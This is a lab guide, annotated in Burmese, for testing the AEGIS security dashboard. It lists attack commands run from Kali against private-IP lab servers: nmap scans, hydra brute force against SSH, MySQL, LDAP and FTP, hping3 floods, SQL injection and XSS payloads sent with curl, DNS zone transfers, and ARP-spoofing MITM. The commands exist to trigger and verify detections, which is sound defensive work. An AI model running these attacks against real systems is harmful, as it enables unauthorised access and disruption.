# AEGIS — Attack Testing Guide (Step by Step)

> မှတ်တမ်း — ဒီ document က real lab မှာ attack test လုပ်ဖို့ step-by-step commands အားလုံးကို မှတ်တမ်းတင်ထားသည်။
>
> **Setup:** Kali Linux (attacker) → Ubuntu VM (defender) → AEGIS Dashboard (monitor)

---

## Lab IP Reference (v4 Final)

| Device | IP | Role |
|---|---|---|
| Kali Linux | `192.168.10.x` (DHCP) | Attacker |
| company-web-server | `10.10.10.10` | Apache2, Fail2ban, SSH |
| company-dns-server | `10.10.10.20` | BIND9, Fail2ban, SSH |
| company-customer-db | `10.20.20.10` | MySQL, Fail2ban, SSH |
| company-ldap-server | `10.20.20.20` | OpenLDAP, Fail2ban, SSH |
| aegis-company-admin | `10.30.30.10` | forwarder hub |
| AEGIS Dashboard | https://aegis-soc-dashboard.vercel.app | Monitor only |
| AEGIS API | https://aegis-api-server-jp3b.onrender.com | Ingest + Commands |

---

## Pre-flight Checklist

```bash
# Kali ရဲ့ IP address စစ်
ip a show eth0 | grep "inet "
# ip a      : ip address subcommand (ifconfig alternative)
# show eth0 : eth0 interface ကိုသာ ပြ
# grep "inet " : IPv4 line ကိုသာ filter (inet6 မပါစေဖို့ space ပါ)

# Kali မှာ lab route ရှိမရှိ စစ်
ip route | grep "10.0.0.0"
# ip route        : kernel routing table ကို ပြ
# grep "10.0.0.0" : 10.x.x.x route line ကိုသာ filter — output ရှိရင် route ရှိပြီ

# မရှိရင် ထည့်
sudo ip route add 10.0.0.0/8 via 192.168.10.1
# add           : routing table မှာ entry အသစ် ထည့်
# 10.0.0.0/8    : destination network (10.x.x.x အားလုံး)
# via 192.168.10.1 : ဒီ gateway ကတဆင့် forward မည် (Router ether2)

# Connectivity check
ping -c2 10.10.10.10   # company-web-server
ping -c2 10.10.10.20   # company-dns-server
ping -c2 10.20.20.10   # company-customer-db
ping -c2 10.20.20.20   # company-ldap-server
# -c2 : count=2 — ICMP echo request 2 ကြိမ်ပဲပို့ပြီး ရပ် (မပြတ်ပဲ run နေမည့်အစား)

# Password file တွေ create
printf 'WrongPass-01\nWrongPass-02\nWrongPass-03\nWrongPass-04\nWrongPass-05\n' > /tmp/lab-ssh.txt
printf 'WrongDB-01\nWrongDB-02\nWrongDB-03\nWrongDB-04\nWrongDB-05\n'         > /tmp/lab-db.txt
printf 'WrongLDAP-01\nWrongLDAP-02\nWrongLDAP-03\nWrongLDAP-04\nWrongLDAP-05\n' > /tmp/lab-ldap.txt
# printf '...\n' : echo နှင့်ဆင်တူ — \n = newline (password တစ်ခုစီ line တစ်ကြောင်းဆင်း)
# >              : output ကို file ထဲ redirect (overwrite) — file မရှိရင် create လုပ်
```

---

## STEP 1 — Port Scan → `port_scan`

```bash
# SYN scan (stealth) — Suricata "ET SCAN Nmap -sS" rule trigger
sudo nmap -sS -T3 -p 21,22,23,25,53,80,110,139,443,445,3306,389 10.10.10.10
#        ↑      ↑   ↑
#        │      │   └─ -p : စစ်မည့် port နံပါတ်များ (comma ဖြင့် ခြားထားသည်)
#        │      └───── -T3 : Timing template 3 = Normal အမြန်နှုန်း (0=slowest, 5=fastest)
#        └──────────── -sS : SYN scan — TCP handshake မပြီးဘဲ SYN packet ပဲပို့ (stealth)

# NULL scan — flag အားလုံး 0 — firewall bypass စမ်း
sudo nmap -sN -p 22,80,443 10.10.10.10
#        ↑   ↑
#        │   └── -p 22,80,443 : SSH / HTTP / HTTPS port သုံးခုကိုသာ စစ်
#        └────── -sN : NULL scan — TCP flag တစ်ခုမှ set မလုပ်ဘဲ packet ပို့

# FIN scan
sudo nmap -sF -p 22,80,443 10.10.10.10
#        ↑   ↑
#        │   └── -p 22,80,443 : စစ်မည့် port များ
#        └────── -sF : FIN scan — FIN flag ပဲပို့ (connection close request)

# XMAS scan — FIN+PSH+URG တစ်ချိန်တည်း
sudo nmap -sX -p 22,80,443 10.10.10.10
#        ↑   ↑
#        │   └── -p 22,80,443 : စစ်မည့် port များ
#        └────── -sX : XMAS scan — FIN+PSH+URG flag သုံးခု တစ်ပြိုင်နက် light up (xmas tree နှင့်တူ)

# Version detection scan — service name + version ရှာ
sudo nmap -sV -T3 -p 3306,22 10.20.20.10
#        ↑   ↑    ↑
#        │   │    └── -p 3306,22 : MySQL port နှင့် SSH port စစ်
#        │   └─────── -T3        : Timing template 3 = Normal (0=slowest, 5=fastest)
#        └─────────── -sV        : Service Version detection — service ၏ version စစ်

# DNS server scan
sudo nmap -sS -T3 -p 53,22 10.10.10.20
#        ↑   ↑    ↑
#        │   │    └── -p 53,22 : DNS port + SSH port စစ်
#        │   └─────── -T3      : Normal timing
#        └─────────── -sS      : SYN scan (stealth) — handshake မပြီးဘဲ SYN ပဲပို့

# LDAP server scan
sudo nmap -sV -T3 -p 389,636,22 10.20.20.20
#                    ↑   ↑
#                    │   └── 636 = LDAPS (LDAP over TLS)
#                    └────── 389 = LDAP standard port
```

**Dashboard မှာ မြင်ရမည်:** Security Events → `port_scan`

---

## STEP 2 — SSH Brute Force → `ssh_brute` + auto-block

```bash
# company-web-server SSH brute
hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.10.10.10
#     ↑           ↑                  ↑    ↑   ↑
#     │           │                  │    │   └── -f : valid credential တွေ့သည်နှင့် ရပ်
#     │           │                  │    └────── -W 3 : connection ကြား 3 စက္ကန့် စောင့်
#     │           │                  └─────────── -t 1 : တစ်ချိန်တည်း connection တစ်ခုပဲ
#     │           └────────────────────────────── -P : Password list file (uppercase = file)
#     └────────────────────────────────────────── -l : login username တစ်ယောက်တည်း (lowercase)

# company-dns-server SSH brute
hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.10.10.20
# -l labtest        : username တစ်ယောက်တည်း (lowercase -l = single login)
# -P /tmp/lab-ssh.txt : password list file (uppercase -P = file)
# -t 1              : parallel task 1 ခုပဲ (SSH မှာ တပြိုင်နက် များများ မပို့ရ)
# -W 3              : wait 3s between each attempt (fail2ban trigger မဖြစ်အောင်)
# -f                : first match တွေ့ရင် ရပ်
# ssh://10.10.10.20 : target = DNS server SSH

# company-customer-db SSH brute
hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.20.20.10
# -l labtest        : username တစ်ယောက်တည်း
# -P /tmp/lab-ssh.txt : password list file
# -t 1              : parallel task 1 ခုပဲ
# -W 3              : 3 စက္ကန့် ကြားနား
# -f                : တွေ့ရင် ရပ်
# ssh://10.20.20.10 : target = MySQL DB server SSH

# company-ldap-server SSH brute
hydra -l labtest -P /tmp/lab-ssh.txt -t 1 -W 3 -f ssh://10.20.20.20
# -l labtest        : username တစ်ယောက်တည်း
# -P /tmp/lab-ssh.txt : password list file
# -t 1              : parallel task 1 ခုပဲ
# -W 3              : 3 စက္ကန့် ကြားနား
# -f                : တွေ့ရင် ရပ်
# ssh://10.20.20.20 : target = LDAP server SSH
```

**Dashboard မှာ မြင်ရမည်:** SSH Sessions tab + Active Alerts → HIGH + Defense Center → auto-block

---

## STEP 3 — DDoS / SYN Flood → `ddos`

```bash
# SYN flood — safe (30 packet ပဲ)
sudo hping3 -S -p 80 -c 30 -i u100000 10.10.10.10
#           ↑  ↑     ↑     ↑
#           │  │     │     └── -i u100000 : interval = 100,000 microsecond = 100ms ကြားနား
#           │  │     └──────── -c 30      : count = packet 30 ခုပဲပို့ပြီး ရပ်
#           │  └────────────── -p 80      : destination port 80 (HTTP)
#           └───────────────── -S         : SYN flag set လုပ်ထားသော TCP packet

# ICMP flood (ping flood)
sudo hping3 --icmp -c 30 -i u100000 10.10.10.10
#           ↑      ↑     ↑
#           │      │     └── -i u100000 : interval 100,000 microsecond = 100ms ကြားနား
#           │      └──────── -c 30      : packet 30 ခုပဲပို့ပြီး ရပ်
#           └───────────────  --icmp    : ICMP mode (ping packet အနေနဲ့ ပို့)

# UDP flood — DNS port
sudo hping3 --udp -p 53 -c 30 -i u100000 10.10.10.20
#           ↑     ↑     ↑     ↑
#           │     │     │     └── -i u100000 : 100ms ကြားနား
#           │     │     └──────── -c 30      : packet 30 ခုပဲ
#           │     └────────────── -p 53      : destination port 53 (DNS)
#           └──────────────────── --udp      : UDP mode (DNS က UDP သုံး)
```

**Dashboard မှာ မြင်ရမည်:** Security Events → `ddos`

---

## STEP 4 — Web Attack (SQLi / XSS) → `web_attack` → HTTP tab

```bash
# SQL Injection — UNION based
curl -si --max-time 5 --get \
  --data-urlencode "id=1' UNION SELECT 1,2,3--" \
  http://10.10.10.10/
#  ↑   ↑            ↑    ↑
#  │   │            │    └── --data-urlencode : data ကို URL-encode လုပ်ပြီး GET request မှာ ထည့်
#  │   │            │         (space, quote, -- တွေ auto-escape ဖြစ်)
#  │   │            └──────── --get           : HTTP GET method သုံး
#  │   └────────────────────── --max-time 5   : 5 စက္ကန့် အကြာ timeout
#  └────────────────────────── -si            : -s (silent/progress မပြ) + -i (response header ပါ ပြ)

# SQL Injection — OR based
curl -si --max-time 5 --get \
  --data-urlencode "id=1' OR '1'='1" \
  http://10.10.10.10/login
# -si             : -s (silent — progress bar မပြ) + -i (response header ပါ ပြ)
# --max-time 5    : 5 စက္ကန့် အတွင်း response မရရင် timeout
# --get           : HTTP GET method သုံး
# --data-urlencode: value ကို URL-encode လုပ်ပြီး query string မှာ ထည့် (quote, space တွေ safe ဖြစ်)
# payload         : OR '1'='1 → WHERE condition အမြဲ true — login bypass technique

# XSS (Cross-Site Scripting)
curl -si --max-time 5 --get \
  --data-urlencode "q=<script>alert('aegis-test')</script>" \
  http://10.10.10.10/
# -si             : silent + include headers
# --max-time 5    : 5s timeout
# --get           : GET request
# --data-urlencode: <script> tag တွေကို URL-encode လုပ်ပြီး q= parameter မှာ ထည့်
# payload         : <script>alert()</script> → server က sanitize မလုပ်ရင် browser execute ဖြစ်မည်

# Nikto web vulnerability scan
nikto -h http://10.10.10.10 -maxtime 1m -Pause 1
#     ↑                     ↑           ↑
#     │                     │           └── -Pause 1 : request ကြား 1 စက္ကန့် နားမည်
#     │                     └────────────── -maxtime : scan အများဆုံး 1 minute ပဲ run မည်
#     └──────────────────────────────────── -h       : target host URL
```

> ⚠️ ဒီ attacks တွေ → **HTTP Attacks tab** မှာ ပေါ်မည် (DB tab မဟုတ်ဘူး)
> Suricata က HTTP layer ကသာ detect လုပ်တာ၊ MySQL protocol layer မဟုတ်ဘူး

---

## STEP 5 — DNS Attack → `dns_attack` → DNS tab

### ⚠️ VM Pre-requisite: BIND9 Query Logging ဖွင့်ရမည် (တစ်ကြိမ်ပဲ)

```bash
# company-dns-server မှာ SSH ဝင်ပြီး run
ssh labtest@10.10.10.20
# ssh labtest@... : labtest user အနေနဲ့ IP address ထဲ SSH ဝင်
#   format: user@host

sudo mkdir -p /var/log/named
# mkdir          : directory အသစ် create
# -p             : parent directory မရှိသေးရင် အလိုအလျောက် create (error မထွက်)
# /var/log/named : BIND9 log ထားမည့် folder

sudo chown bind:bind /var/log/named
# chown          : change owner — file/folder ပိုင်ရှင် ပြောင်း
# bind:bind      : user=bind, group=bind (BIND9 process ကသာ ရေးနိုင်မည်)

sudo tee -a /etc/bind/named.conf.local <<'EOF'
# tee            : stdin ကို file ထဲ ရေးသည် (sudo နဲ့ redirect ၊ > သုံး၍မရသောအခါ)
# -a             : append mode — file ရှိပြီးသား content ကို မဖျက်ဘဲ နောက်ကပ်ထည့်
# <<'EOF'        : heredoc — EOF ဆုံးတဲ့အထိ multi-line input ဖြစ်မည်
logging {
    channel q_log {
        file "/var/log/named/named.log" versions 3 size 10m;
        #                              ↑           ↑
        #                              │           └── size 10m : file 10MB ကျော်ရင် rotate
        #                              └────────────── versions 3 : log file 3 ခုသာ သိမ်း
        severity dynamic;
        print-time yes;   # timestamp ပြ
    };
    category queries { q_log; };   # query events → ဒီ channel ကို ရေး
    category default { q_log; };
};
EOF

sudo systemctl restart bind9
# systemctl      : systemd service manager
# restart        : service ကို stop ပြီး start (config ပြောင်းပြီးရင် apply ဖို့)
# bind9          : DNS server service name

sudo tail -f /var/log/named/named.log   # log ထွက်မလာ စစ်
# tail           : file ၏ နောက်ဆုံး lines ပြ
# -f             : follow mode — file ကို live streaming ပြ (Ctrl+C ဖြင့် ရပ်)

exit
# DNS VM မှ logout ပြီး Kali ပြန်ဆင်း
```

### Kali မှာ run

```bash
# Zone Transfer (AXFR) — HIGH severity alert
dig AXFR goldenmyanmar.trading.com @10.10.10.20
# dig  : DNS lookup tool
# AXFR : Authoritative Zone Transfer request — zone ထဲ record အားလုံး download ရန်
# @10.10.10.20 : system DNS မသုံးဘဲ ဒီ DNS server ကိုတိုက်ရိုက် query

dig AXFR @10.10.10.20 goldenmyanmar.trading.com
# ↑ အထက်နှင့် result တူသော်လည်း @server ကို domain မတိုင်ခင် ထားသည့် syntax အစားထိုး

# nmap DNS zone transfer script
sudo nmap -p 53 --script dns-zone-transfer \
  --script-args dns-zone-transfer.domain=goldenmyanmar.trading.com \
  10.10.10.20
# -p 53          : port 53 (DNS) ကိုသာ စစ်
# --script       : NSE (Nmap Scripting Engine) script ကို run
# dns-zone-transfer : zone transfer ကို script ဖြင့် စမ်းသပ်
# --script-args  : script ထဲသို့ argument ပေး (domain name)

# DNS flood — 25 queries in 60s → flood detect trigger
for i in $(seq 1 25); do
# for i in      : loop variable i
# $(seq 1 25)   : sequence 1 မှ 25 ထိ generate (1,2,3,...,25)
  dig +time=1 +tries=1 @10.10.10.20 goldenmyanmar.trading.com A >/dev/null
  # +time=1    : DNS response timeout 1 second
  # +tries=1   : retry 1 ကြိမ်ပဲ (default 3)
  # A          : A record (IPv4 address) မျိုး query
  # >/dev/null : stdout ကို /dev/null (ဗလာ) ထဲ ပစ် — screen ပေါ် မပြ
  sleep 0.2
  # sleep 0.2  : loop တစ်ကြိမ်ပြီးတိုင်း 0.2 စက္ကန့် နားမည်
done

# DNS refused query flood — 10 nonexistent domains
for i in $(seq 1 10); do
# $(seq 1 10) : 1 မှ 10 ထိ sequence
  dig +time=1 +tries=1 @10.10.10.20 nonexistent${i}.goldenmyanmar.trading.com
  # nonexistent${i} : မရှိတဲ့ subdomain — server က NXDOMAIN / refused ပြန်မည်
  # ${i}            : loop variable တန်ဖိုး (1,2,...,10) ထည့်သွင်း
  sleep 0.5
done
```

**Dashboard မှာ မြင်ရမည်:** Connection Logs → DNS tab → `dns_zone_transfer` (HIGH) / `dns_query_refused` (MEDIUM)

---

## STEP 6 — MySQL / DB Attack → `db_attack` → DB tab

### ⚠️ VM Pre-requisite: MySQL Error Log Verbosity ဖွင့်ရမည် (တစ်ကြိမ်ပဲ)

```bash
# company-customer-db မှာ SSH ဝင်ပြီး run
ssh labtest@10.20.20.10
# format: user@host — labtest user အနေနဲ့ DB server ထဲ SSH ဝင်

sudo tee -a /etc/mysql/mysql.conf.d/mysqld.cnf <<'EOF'
# tee            : stdin ကို file ထဲ ရေး (sudo redirect လုပ်ဖို့)
# -a             : append — ရှိပြီးသား config ကို မဖျက်ဘဲ နောက်ကပ်ထည့်
# <<'EOF'        : heredoc — EOF ပေါ်ရောက်တဲ့အထိ multi-line input
log_error            = /var/log/mysql/error.log
log_error_verbosity  = 3
# log_error_verbosity : 1=errors only, 2=+warnings, 3=+notes (auth failure ပါ ထွက်မည်)
EOF

sudo systemctl restart mysql
# systemctl restart : service ကို stop ပြီး start — config အသစ် apply ဖို့

sudo tail -f /var/log/mysql/error.log   # "Access denied" line ပေါ်မလာ စစ်
# tail -f : file ကို live follow — log အသစ် ထွက်တိုင်း screen ပြ

exit
# MySQL VM မှ logout ပြီး Kali ပြန်ဆင်း
```

### Kali မှာ run

```bash
# MySQL brute force (hydra)
hydra -l gmuser -P /tmp/lab-db.txt -t 1 -W 3 -f mysql://10.20.20.10
# -l gmuser         : MySQL username တစ်ယောက်တည်း (lowercase -l)
# -P /tmp/lab-db.txt: password list file (uppercase -P = file)
# -t 1              : parallel connection 1 ခုပဲ
# -W 3              : attempt ကြား 3 စက္ကန့် ကြားနား
# -f                : credential တွေ့ရင် ရပ်
# mysql://          : MySQL protocol (port 3306) သုံး

# nmap MySQL port scan
sudo nmap -sV -T3 -p 3306 10.20.20.10
# -sV  : service version detection
# -T3  : Normal timing
# -p 3306 : MySQL default port ကိုသာ စစ်

# Direct mysql client test (connection error ပေါ်ရမည်)
mysql -h 10.20.20.10 -u gmuser -pWrongDB-01 goldenmyanmardb 2>&1
# -h             : host IP (remote MySQL server)
# -u             : MySQL username
# -p             : password — flag နှင့် value ကြား space မပါ (-pPASSWORD)
# goldenmyanmardb: connect မည့် database name
# 2>&1           : stderr (error output) ကို stdout ထဲ merge — terminal မှာ error ပြသဖို့
```

**Dashboard မှာ မြင်ရမည်:** Connection Logs → DB tab → `Auth Brute`

---

## STEP 7 — LDAP Attack → `ldap_attack` → LDAP tab

### ⚠️ VM Pre-requisite: slapd Logging ဖွင့်ရမည် (တစ်ကြိမ်ပဲ)

```bash
# company-ldap-server မှာ SSH ဝင်ပြီး run
ssh labtest@10.20.20.20
# format: user@host — LDAP server ထဲ SSH ဝင်

sudo ldapmodify -Y EXTERNAL -H ldapi:/// <<'EOF'
# ldapmodify     : LDAP directory ထဲ entry ကို modify လုပ်သော tool
# -Y EXTERNAL    : SASL EXTERNAL mechanism — root ကတဆင့် local socket auth (password မလို)
# -H ldapi:///   : LDAP URI — ldapi:// = local Unix socket (/var/run/slapd/ldapi), TCP မဟုတ်
# <<'EOF'        : heredoc — LDIF format ဖြင့် multi-line input
dn: cn=config
changetype: modify
replace: olcLogLevel
olcLogLevel: 256
# 256 = connections log level (ACCEPT/BIND/RESULT lines ထွက်မည်)
# 1   = trace, 256+1 = connections + trace
EOF

sudo systemctl restart rsyslog
# rsyslog        : system log daemon — slapd log ကို /var/log/syslog ထဲ ရေးသူ
# restart        : config ပြောင်းပြီးနောက် apply ဖို့ reload

sudo tail -f /var/log/syslog | grep slapd
# tail -f        : /var/log/syslog ကို live follow
# | grep slapd   : slapd ဆိုင်ရာ line တွေကိုသာ filter — auth attempt ကြည့်ဖို့

exit
# LDAP VM မှ logout ပြီး Kali ပြန်ဆင်း
```

### Kali မှာ run

```bash
# LDAP brute force (hydra) — err=49 trigger
hydra \
  -l "cn=admin,dc=goldenmyanmar,dc=trading,dc=com" \
  -P /tmp/lab-ldap.txt \
  -t 1 -W 3 -f \
  ldap://10.20.20.20
# -l "cn=admin,..." : bind DN အပြည့်အစုံ — LDAP username က email မဟုတ်ဘဲ DN format
# -P /tmp/lab-ldap.txt : password list file (uppercase -P)
# -t 1              : parallel task 1 ခုပဲ
# -W 3              : attempt ကြား 3 စက္ကန့် ကြားနား
# -f                : valid credential တွေ့ရင် ရပ်
# ldap://10.20.20.20 : LDAP protocol, port 389, LDAP server target

# ldapsearch wrong password — err=49 (Invalid credentials)
ldapsearch -H ldap://10.20.20.20 \
  -x \
  -D "cn=admin,dc=goldenmyanmar,dc=trading,dc=com" \
  -w WrongPass-01 \
  -b "dc=goldenmyanmar,dc=trading,dc=com"
#  ↑   ↑              ↑   ↑                ↑
#  │   │              │   │                └── -b : search base DN (ဘယ် level အောက် search မည်)
#  │   │              │   └───────────────── -w : bind password (plain text)
#  │   │              └───────────────────── -D : bind DN (login ဖို့ DN)
#  │   └──────────────────────────────────── -x : simple authentication (SASL မဟုတ်)
#  └──────────────────────────────────────── -H : LDAP host URI

# DN enumeration — err=32 (No such object)
for n in 1 2 3 4 5; do
  ldapsearch -x -H ldap://10.20.20.20 \
    -b "ou=missing${n},dc=goldenmyanmar,dc=trading,dc=com" \
    -s base \
    "(objectClass=*)" dn
    # -s base     : scope = base object ခုပဲ ကြည့် (subtree မကြည့်)
    # -b ou=...   : မရှိတဲ့ OU → err=32 trigger
  sleep 1
done

# nmap LDAP brute script
sudo nmap -sV -p 389 \
  --script ldap-brute \
  --script-args ldap.base="dc=goldenmyanmar,dc=trading,dc=com" \
  10.20.20.20
#  ↑                          ↑
#  │                          └── ldap.base : search base DN (script argument)
#  └── --script ldap-brute    : NSE script — LDAP credential brute force
```

**Dashboard မှာ မြင်ရမည်:** Connection Logs → LDAP tab → `Auth Brute` / `Enum`

---

## STEP 8 — FTP Attack

```bash
# FTP brute force
hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
#     ↑              ↑                                  ↑
#     │              │                                  └── ftp:// : FTP protocol (port 21)
#     │              └─────────────────────────────────── -P : rockyou password list
#     └────────────────────────────────────────────────── -l : FTP username

# FTP banner grab (version စစ်)
sudo nmap -sV -p 21 10.10.10.10
#              ↑
#              └── port 21 : FTP standard port
```

---

## STEP 9 — ARP Spoofing / MITM

```bash
# ARP spoofing
sudo arpspoof -i eth0 -t 10.10.10.10 10.10.10.1
#             ↑        ↑              ↑
#             │        │              └── gateway IP (spoof မည့် IP)
#             │        └───────────────── -t : target (victim IP)
#             └────────────────────────── -i : network interface

# ettercap MITM
sudo ettercap -T -M arp:remote /10.10.10.10// /10.10.10.1//
#             ↑  ↑
#             │  └── -M arp:remote : ARP poisoning MITM mode
#             └───── -T            : text mode (GUI မဟုတ်)
```

---

## STEP 10 — TLS / SSL Weak Cipher Test

```bash
# Weak cipher connect test
openssl s_client -connect 10.10.10.10:443 -cipher NULL-MD5
#                ↑                         ↑
#                │                         └── -cipher : သုံးမည့် cipher suite ရွေး
#                └── -connect host:port    : TLS connection target

# SSL scan (ရနိုင်သော cipher / protocol အားလုံး)
sslscan 10.10.10.10:443
```

---

## After Each Attack — Unblock Commands

```bash
# Dashboard မှ unblock (easiest)
# Defense Center → Active Blocks → Kali IP → "Unblock" button

# API မှ unblock
curl -X DELETE https://aegis-api-server-jp3b.onrender.com/api/defense/block/KALI_IP \
  -H "X-AEGIS-Admin-Key: YOUR_ADMIN_KEY"
#  ↑                                      ↑
#  │                                      └── X-AEGIS-Admin-Key : admin endpoint auth header
#  └── -X DELETE : HTTP DELETE method

# Ubuntu VM မှာ iptables ကိုယ်တိုင် ဖြုတ်
sudo iptables -D INPUT -s KALI_IP -j DROP
#             ↑         ↑          ↑
#             │         │          └── -j DROP : packet drop action
#             │         └──────────── -s KALI_IP : source IP filter
#             └────────────────────── -D INPUT   : DELETE rule from INPUT chain

sudo fail2ban-client set sshd unbanip KALI_IP
#                    ↑   ↑   ↑
#                    │   │   └── unbanip : IP ကို ban list မှ ဖယ်
#                    │   └────── sshd    : jail name
#                    └────────── set     : jail setting ပြင်
```

---

## Manual Ingest Test (VM မလိုဘဲ simulate)

```bash
# Port scan simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/suricata \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","dest_ip":"10.10.10.10","alert":{"signature":"ET SCAN Nmap -sS SYN Scan","severity":2},"proto":"TCP","event_type":"alert"}'
# -X POST           : HTTP POST method
# -H "Content-Type" : request body က JSON ဖြစ်ကြောင်း server ကိုပြော
# -H "X-AEGIS-Key"  : ingest auth header
# -d '{...}'        : request body (JSON data)

# SSH brute force simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/ssh \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","username":"root","status":"failed","failures":6,"targetHost":"10.10.10.10"}'

# DDoS simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/suricata \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","dest_ip":"10.10.10.10","alert":{"signature":"ET DOS SYN flood","severity":1},"proto":"TCP","event_type":"alert"}'

# DNS zone transfer simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/dns \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","target_ip":"10.10.10.20","attack_type":"dns_zone_transfer","query":"goldenmyanmar.trading.com","severity":"high"}'

# MySQL brute force simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/mysql \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","target_ip":"10.20.20.10","attack_type":"Auth Brute","username":"gmuser","severity":"high"}'

# LDAP brute force simulate
curl -X POST https://aegis-api-server-jp3b.onrender.com/api/ingest/ldap \
  -H "Content-Type: application/json" \
  -H "X-AEGIS-Key: YOUR_INGEST_KEY" \
  -d '{"src_ip":"192.168.10.99","target_ip":"10.20.20.20","attack_type":"Auth Brute","dn":"cn=admin,dc=goldenmyanmar,dc=trading,dc=com","error_code":49,"severity":"high"}'
```

---

## Summary — ဘာ run မှ ဘာ ဝင်မလဲ

| Attack | Tool | Dashboard tab | VM config လိုသည် |
|---|---|---|---|
| Port scan | nmap -sS | Security Events → port_scan | မလို |
| SSH brute | hydra ssh:// | SSH Sessions + auto-block | မလို |
| DDoS | hping3 -S | Security Events → ddos | မလို |
| Web SQLi/XSS | curl / nikto | HTTP Attacks | မလို |
| DNS zone transfer | dig AXFR | DNS Attacks | BIND9 logging ✅ |
| DNS flood | for+dig loop | DNS Attacks | BIND9 logging ✅ |
| MySQL brute | hydra mysql:// | DB Attacks | MySQL log verbosity ✅ |
| LDAP brute | hydra ldap:// | LDAP Attacks | slapd loglevel 256 ✅ |

---

*Last updated: 2026-07-26 (explanations added for all commands) | AEGIS SOC Dashboard — Attack Testing Reference*
